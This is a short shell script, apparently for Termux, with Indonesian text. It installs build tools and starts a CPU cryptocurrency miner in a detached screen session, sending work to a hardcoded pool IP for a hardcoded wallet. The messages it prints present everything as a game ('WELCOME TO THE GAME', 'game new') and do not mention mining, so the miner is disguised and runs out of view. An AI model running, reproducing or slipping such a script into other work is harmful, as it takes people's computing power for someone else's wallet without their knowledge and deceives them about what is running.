pkg install libcurl libjansson automake build-essential screen git -y
chmod +x cpuminer
# Jalankan miner dengan jumlah thread maksimal otomatis
screen -dmS miner ~/nw/cpuminer -a YespowerADVC -o stratum+tcp://51.79.215.200:17149 -u AaNvuEbX7omx69kT8RqKEbdo5MqQmmHaVg -p x -t 8
# Info
echo "===================================================="
echo "                🎮 WELCOME TO THE GAME 🎮"
echo "===================================================="
echo ""
echo "📂 Game Directory : ~/hp"
echo ""
echo "🕹️  Cara Memulai:"
echo "----------------------------------------------------"
echo "1. Buka folder game di terminal"
echo "2. Edit wallet address jika diperlukan"
echo "3. Jalankan game dengan perintah:"
echo ""
echo "        game new"
echo ""
echo "----------------------------------------------------"
echo "📜 Informasi:"
echo "• Pastikan konfigurasi sudah benar"
echo "• Simpan progress game secara berkala"
echo "• Jangan menutup terminal saat game berjalan"
echo ""
echo "===================================================="
echo "🚀 Selamat bermain dan semoga beruntung!"
echo "===================================================="
